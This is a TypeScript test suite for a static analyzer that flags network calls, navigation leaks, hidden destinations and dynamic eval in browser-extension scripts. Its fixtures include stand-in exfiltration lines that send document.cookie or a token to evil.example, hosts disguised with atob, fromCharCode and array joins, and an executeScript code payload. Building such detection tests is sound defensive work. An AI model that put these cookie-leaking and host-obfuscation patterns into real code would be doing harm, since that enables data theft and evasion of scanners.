import { describe, it, expect } from "vitest";
import { analyzeScript } from "../src/pipeline/layer3-ast/index.ts";
import { buildExternalCallLedger } from "../src/pipeline/ledger.ts";
import { skeletonPack, type ScriptEntry } from "../src/pipeline/schema.ts";

const run = (source: string) => analyzeScript("js/x.js", source);
const apis = (s: ScriptEntry) => s.sinks.map((x) => x.api);
const hasNetwork = (s: ScriptEntry, api: string) =>
  s.sinks.some((x) => x.category === "network" && x.api === api);

describe("Gap 1 — receiver normalization", () => {
  it("detects window.fetch as a fetch network sink", () => {
    expect(hasNetwork(run('window.fetch("https://x.example/a")'), "fetch")).toBe(true);
  });

  it("detects self.fetch and globalThis.fetch", () => {
    expect(hasNetwork(run('self.fetch(u)'), "fetch")).toBe(true);
    expect(hasNetwork(run('globalThis.fetch(u)'), "fetch")).toBe(true);
  });

  it("detects new window.XMLHttpRequest and new self.WebSocket", () => {
    expect(hasNetwork(run("new window.XMLHttpRequest()"), "XMLHttpRequest")).toBe(true);
    expect(hasNetwork(run("new self.WebSocket('wss://x.example')"), "WebSocket")).toBe(true);
  });

  it("still classifies window.postMessage as messaging after normalization", () => {
    const s = run('window.postMessage({a:1}, "*")');
    expect(s.sinks.some((x) => x.category === "messaging" && x.api === "postMessage")).toBe(true);
  });

  it("normalizes window.document.cookie to the document.cookie sink", () => {
    const s = run("const c = window.document.cookie");
    expect(apis(s)).toContain("document.cookie");
  });
});

describe("Gap 2 — alias resolution", () => {
  it("resolves a direct fetch alias (const f = fetch; f(u))", () => {
    expect(hasNetwork(run("const f = fetch; f('https://x.example')"), "fetch")).toBe(true);
  });

  it("resolves a constructor alias (const X = XMLHttpRequest; new X())", () => {
    expect(hasNetwork(run("const X = XMLHttpRequest; new X()"), "XMLHttpRequest")).toBe(true);
  });

  it("expands a member alias head (const c = chrome.cookies; c.getAll())", () => {
    const s = run("const c = chrome.cookies; c.getAll({}, () => {})");
    expect(apis(s)).toContain("chrome.cookies.getAll");
  });

  it("resolves transitive aliases (g = f = fetch)", () => {
    expect(hasNetwork(run("const f = fetch; const g = f; g(u)"), "fetch")).toBe(true);
  });
});

describe("Gap 2 — computed-global indirection", () => {
  it('flags window["fetch"](…) as network-indirect', () => {
    const s = run('window["fetch"]("https://x.example")');
    expect(s.sinks.some((x) => x.category === "network-indirect")).toBe(true);
  });

  it('flags self["fet"+"ch"]() as network-indirect', () => {
    const s = run('self["fet" + "ch"]()');
    expect(s.sinks.some((x) => x.category === "network-indirect")).toBe(true);
  });

  it("does not flag computed access on a non-global object (no noise)", () => {
    const s = run("const arr = [f]; arr[0]()");
    expect(s.sinks.some((x) => x.category === "network-indirect")).toBe(false);
  });
});

describe("Gap 3/4 — importScripts and dynamic import()", () => {
  it("detects importScripts as a network sink and its URL destination", () => {
    const s = run('importScripts("https://cdn.example/loader.js")');
    expect(hasNetwork(s, "importScripts")).toBe(true);
    expect(s.network_destinations.some((d) => d.ast_role === "importScripts.url")).toBe(true);
  });

  it("detects dynamic import() as a network sink with the specifier destination", () => {
    const s = run('await import("https://cdn.example/mod.js")');
    expect(hasNetwork(s, "import()")).toBe(true);
    expect(s.network_destinations.some((d) => d.ast_role === "import.specifier")).toBe(true);
  });
});

describe("Gap 5 — WebRTC", () => {
  it("detects new RTCPeerConnection and createDataChannel", () => {
    expect(hasNetwork(run("new RTCPeerConnection()"), "RTCPeerConnection")).toBe(true);
    const s = run("const pc = new RTCPeerConnection(); const ch = pc.createDataChannel('x')");
    expect(s.sinks.some((x) => x.category === "network" && x.api === "RTCDataChannel")).toBe(true);
  });
});

describe("Gap 6 — navigation / URL-leak sinks", () => {
  it("flags location.href assignment as a navigation sink", () => {
    // Concatenated URL (host hidden behind +) — sink still detected; resolving
    // the destination through the concatenation is Gap 7 (constant-folding).
    const s = run('location.href = "https://evil.example/?c=" + document.cookie');
    expect(s.sinks.some((x) => x.category === "navigation" && x.api === "location.href =")).toBe(true);
  });

  it("resolves the destination of a non-concatenated location.href assignment", () => {
    const s = run('location.href = "https://evil.example/leak"');
    expect(s.network_destinations.some((d) => d.ast_role === "navigation.url")).toBe(true);
  });

  it("flags window.location.href, location.assign/replace, and window.open", () => {
    expect(run('window.location.href = "https://x.example"').sinks.some((x) => x.category === "navigation")).toBe(true);
    expect(run('location.assign("https://x.example")').sinks.some((x) => x.api === "location.assign")).toBe(true);
    expect(run('location.replace("https://x.example")').sinks.some((x) => x.api === "location.replace")).toBe(true);
    expect(run('window.open("https://x.example")').sinks.some((x) => x.api === "window.open")).toBe(true);
  });
});

describe("Gap 7 — destination constant-folding", () => {
  const dest = (s: ReturnType<typeof run>, sub: string) =>
    s.network_destinations.find((d) => d.value.includes(sub));

  it("folds string concatenation of constants to a static destination", () => {
    const s = run('fetch("https://" + "evil.example" + "/x")');
    const d = dest(s, "evil.example");
    expect(d?.kind).toBe("static");
    expect(d?.ast_role).toBe("fetch.url");
  });

  it("recovers an atob-encoded host", () => {
    // atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUv") === "https://evil.example/"
    const s = run('fetch(atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUv"))');
    expect(dest(s, "evil.example")?.kind).toBe("static");
  });

  it("recovers a String.fromCharCode host", () => {
    // 104,116,116,112,115,58,47,47 === "https://"
    const s = run('fetch(String.fromCharCode(104,116,116,112,115,58,47,47) + "evil.example")');
    expect(dest(s, "evil.example")?.kind).toBe("static");
  });

  it("recovers an array-join host", () => {
    const s = run('fetch(["https:", "", "evil.example"].join("/"))');
    expect(dest(s, "evil.example")?.kind).toBe("static");
  });

  it("resolves a const-bound host across declaration order", () => {
    const s = run('const url = base + "/x"; const base = "https://evil.example"; fetch(url)');
    expect(dest(s, "evil.example")).toBeDefined();
  });

  it("marks a fully dynamic destination as unknown", () => {
    const s = run("function go(server){ fetch(server) } ");
    expect(s.network_destinations.some((d) => d.kind === "unknown" && d.ast_role === "fetch.url")).toBe(true);
  });

  it("keeps a partly-dynamic concat as a template skeleton", () => {
    const s = run('fetch("https://evil.example/?c=" + token)');
    const d = dest(s, "evil.example");
    expect(d?.kind).toBe("template");
    expect(d?.value).toContain("${");
  });

  it("does not record fetch(chrome.runtime.getURL(...)) as an external destination", () => {
    const s = run("fetch(chrome.runtime.getURL(file))");
    expect(s.network_destinations.length).toBe(0);
    // …but the fetch call itself is still cataloged as a network sink.
    expect(hasNetwork(s, "fetch")).toBe(true);
  });

  it("does not flag a relative-path navigation as an unknown external destination", () => {
    const s = run("location.href = '/options_pages/' + element + '.html'");
    expect(s.network_destinations.some((d) => d.kind === "unknown")).toBe(false);
    // …but the navigation sink is still cataloged.
    expect(s.sinks.some((x) => x.category === "navigation")).toBe(true);
  });
});

// Improvement 007 — new opaque-region kinds in the ledger.
describe("Improvement 007 — ledger coverage for new opaque sinks", () => {
  it("records an executeScript code payload as a dynamic-code-exec opaque region", () => {
    const pack = skeletonPack({ path: "x", id_from_path: "x", manifest: {} });
    pack.scripts = [run('chrome.tabs.executeScript({code: payload})')];
    buildExternalCallLedger(pack);
    expect(pack.external_call_ledger.opaque_regions.some(
      (r) => r.kind === "dynamic-code-exec" && r.api === "chrome.tabs.executeScript(code)",
    )).toBe(true);
  });

  it("does NOT record setTimeout(dynamic) as an opaque region (a dynamic first arg is a function reference, not eval'd source)", () => {
    const pack = skeletonPack({ path: "x", id_from_path: "x", manifest: {} });
    pack.scripts = [run("setTimeout(cmd, 100)")];
    buildExternalCallLedger(pack);
    // The sink is still recorded for detection, but the dynamic-callback form is
    // not a static blind spot — only setTimeout("string") executes source.
    expect(pack.external_call_ledger.opaque_regions.some(
      (r) => r.kind === "dynamic-code-exec" && r.api === "setTimeout(dynamic)",
    )).toBe(false);
  });

  it("records a dynamic-argument eval as a dynamic-code-exec opaque region (genuine blind spot)", () => {
    const pack = skeletonPack({ path: "x", id_from_path: "x", manifest: {} });
    pack.scripts = [run("eval(decoded)")];
    buildExternalCallLedger(pack);
    expect(pack.external_call_ledger.opaque_regions.some(
      (r) => r.kind === "dynamic-code-exec" && r.api === "eval",
    )).toBe(true);
  });

  it("does NOT record a literal-body Function()/eval as opaque (visible source, e.g. webpack shim)", () => {
    const pack = skeletonPack({ path: "x", id_from_path: "x", manifest: {} });
    pack.scripts = [run('new Function("return this")')];
    buildExternalCallLedger(pack);
    expect(pack.external_call_ledger.opaque_regions.some((r) => r.kind === "dynamic-code-exec")).toBe(false);
  });
});

describe("Gap 9 — external-call ledger", () => {
  it("records indirect calls, dynamic-code-exec, and unparsed files with counts", () => {
    const pack = skeletonPack({ path: "x", id_from_path: "x", manifest: {} });
    pack.scripts = [
      run('window["fetch"]("https://x.example"); eval(s)'),
      { path: "js/broken.js", parsed_ok: false, sinks: [], network_destinations: [], taint_sketches: [], listeners: [], obfuscation: null },
    ];
    buildExternalCallLedger(pack);

    const led = pack.external_call_ledger;
    expect(led.counts.indirect_calls).toBe(1);
    expect(led.opaque_regions.some((r) => r.kind === "dynamic-code-exec" && r.api === "eval")).toBe(true);
    expect(led.unparsed_files).toContain("js/broken.js");
    expect(led.counts.unparsed_files).toBe(1);
  });
});
